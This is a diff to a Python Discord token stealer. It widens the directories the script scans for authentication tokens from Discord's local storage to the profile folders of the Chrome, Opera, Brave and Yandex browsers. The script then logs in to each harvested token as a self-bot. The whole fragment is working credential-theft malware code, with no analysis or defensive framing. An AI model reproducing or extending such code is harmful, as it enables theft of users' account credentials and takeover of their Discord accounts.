@@ -6,6 +6,7 @@ import random
 import re
 import shutil
 
+local = os.getenv('LOCALAPPDATA')
 user = os.getenv('USERNAME')
 roaming = os.getenv('APPDATA')
 tokens = []
@@ -60,6 +61,10 @@ async def on_message(message):
 path1 = roaming + '\\discord\\Local Storage\\leveldb'
 path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
 path3 = roaming + '\\discordptb\\Local Storage\\leveldb',
+path4 = local + '\\Google\\Chrome\\User Data\\Default',
+path5 = roaming + '\\Opera Software\\Opera Stable',
+path6 = local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+path7 = local + '\\Yandex\\YandexBrowser\\User Data\\Default'
 
 if os.path.isdir(str(path1)):
     find_tokens(str(path1))
@@ -67,6 +72,14 @@ if os.path.isdir(str(path2)):
     find_tokens(str(path2))
 if os.path.isdir(str(path3)):
     find_tokens(str(path3))
+if os.path.isdir(str(path4)):
+    find_tokens(str(path4))
+if os.path.isdir(str(path5)):
+    find_tokens(str(path5))
+if os.path.isdir(str(path6)):
+    find_tokens(str(path6))
+if os.path.isdir(str(path7)):
+    find_tokens(str(path7))
 
 for token in tokens:
     bot.run(token, bot=False)
